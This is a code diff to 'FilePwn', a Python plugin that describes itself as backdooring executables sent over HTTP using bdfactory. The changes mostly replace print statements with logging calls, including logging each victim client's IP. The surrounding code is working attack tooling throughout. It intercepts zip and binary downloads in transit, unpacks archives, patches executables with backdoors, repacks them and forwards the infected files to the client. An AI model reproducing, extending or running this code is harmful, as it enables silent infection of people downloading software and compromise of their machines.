@@ -25,7 +25,6 @@ class FilePwn(Plugin):
     optname = "filepwn"
     implements = ["handleResponse"]
     has_opts = False
-    log_level = logging.DEBUG
     desc = "Backdoor executables being sent over http using bdfactory"
 
     def convert_to_Bool(self, aString):
@@ -160,17 +159,15 @@ class FilePwn(Plugin):
             return result
 
         except Exception as e:
-            print 'Exception', str(e)
             logging.warning("EXCEPTION IN binaryGrinder %s", str(e))
             return None
     
     def zipGrinder(self, aZipFile):
         "When called will unpack and edit a Zip File and return a zip file"
 
-        print "[*] ZipFile size:", len(aZipFile) / 1024, 'KB'
+        logging.info("ZipFile size: %s KB" % (len(aZipFile) / 1024))
 
         if len(aZipFile) > int(self.userConfig['ZIP']['maxSize']):
-            print "[!] ZipFile over allowed size"
             logging.info("ZipFIle maxSize met %s", len(aZipFile))
             return aZipFile
 
@@ -194,20 +191,20 @@ class FilePwn(Plugin):
                 logging.info('Encrypted zipfile found. Not patching.')
                 return aZipFile
 
-        print "[*] ZipFile contents and info:"
+        logging.info("ZipFile contents and info:")
 
         for info in zippyfile.infolist():
-            print "\t", info.filename, info.date_time, info.file_size
+            logging.info("\t%s %s %s" % (info.filename, info.date_time, info.file_size))
 
         zippyfile.extractall(tmpDir)
 
         patchCount = 0
 
         for info in zippyfile.infolist():
-            print "[*] >>> Next file in zipfile:", info.filename
+            logging.info(">>> Next file in zipfile: %s" % info.filename)
 
             if os.path.isdir(tmpDir + '/' + info.filename) is True:
-                print info.filename, 'is a directory'
+                logging.info('%s is a directory' % info.filename)
                 continue
             #Check against keywords
             keywordCheck = False
@@ -223,8 +220,7 @@ class FilePwn(Plugin):
                         continue
 
             if keywordCheck is True:
-                print "[!] Zip blacklist enforced!"
-                logging.info('Zip blacklist enforced on %s', info.filename)
+                logging.info('Zip blacklist enforced on %s' % info.filename)
                 continue
 
             patchResult = self.binaryGrinder(tmpDir + '/' + info.filename)
@@ -232,15 +228,12 @@ class FilePwn(Plugin):
             if patchResult:
                 patchCount += 1
                 file2 = "backdoored/" + os.path.basename(info.filename)
-                print "[*] Patching complete, adding to zip file."
                 shutil.copyfile(file2, tmpDir + '/' + info.filename)
-                logging.info("%s in zip patched, adding to zipfile", info.filename)
+                logging.info("%s in zip patched, adding to zipfile" % info.filename)
 
             else:
-                print "[!] Patching failed"
-                logging.info("%s patching failed. Keeping original file in zip.", info.filename)
+                logging.info("%s patching failed. Keeping original file in zip." % info.filename)
 
-            print '-' * 10
 
             if patchCount >= int(self.userConfig['ZIP']['patchCount']):  # Make this a setting.
                 logging.info("Met Zip config patchCount limit.")
@@ -250,12 +243,12 @@ class FilePwn(Plugin):
 
         zipResult = zipfile.ZipFile(tmpFile, 'w', zipfile.ZIP_DEFLATED)
 
-        print "[*] Writing to zipfile:", tmpFile
+        logging.debug("Writing to zipfile: %s" % tmpFile)
 
         for base, dirs, files in os.walk(tmpDir):
             for afile in files:
                     filename = os.path.join(base, afile)
-                    print '[*] Writing filename to zipfile:', filename.replace(tmpDir + '/', '')
+                    logging.debug('[*] Writing filename to zipfile: %s' % filename.replace(tmpDir + '/', ''))
                     zipResult.write(filename, arcname=filename.replace(tmpDir + '/', ''))
 
         zipResult.close()
@@ -273,12 +266,14 @@ class FilePwn(Plugin):
         content_header = request.client.headers['Content-Type']
 
         if content_header in self.zipMimeTypes:
-            print "[+] Detected supported zip file type!"
+            logging.info("%s Detected supported zip file type!" % request.client.getClientIP())
             bd_zip = self.zipGrinder(data)
-            return {'request':request,'data':bd_zip}
+            if bd_zip:
+                logging.info("%s Patching complete, forwarding to client" % request.client.getClientIP())
+                return {'request':request,'data':bd_zip}
 
         elif content_header in self.binaryMimeTypes:
-            print "[+] Detected supported binary type!"   
+            logging.info("%s Detected supported binary type!" % request.client.getClientIP())   
             fd, tmpFile = mkstemp()
             with open(tmpFile, 'w') as f:
                 f.write(data)
@@ -288,9 +283,9 @@ class FilePwn(Plugin):
             if patchb:
                 bd_binary = open("backdoored/" + os.path.basename(tmpFile), "rb").read()
                 os.remove('./backdoored/' + os.path.basename(tmpFile))
-                print "[*] Patching complete, forwarding to user."
+                logging.info("%s Patching complete, forwarding to client" % request.client.getClientIP())
                 return {'request':request,'data':bd_binary}
 
         else:
-            print "[-] File is not of supported Content-Type: %s" % content_header
+            logging.debug("%s File is not of supported Content-Type: %s" % (request.client.getClientIP(), content_header))
             return {'request':request,'data':data}
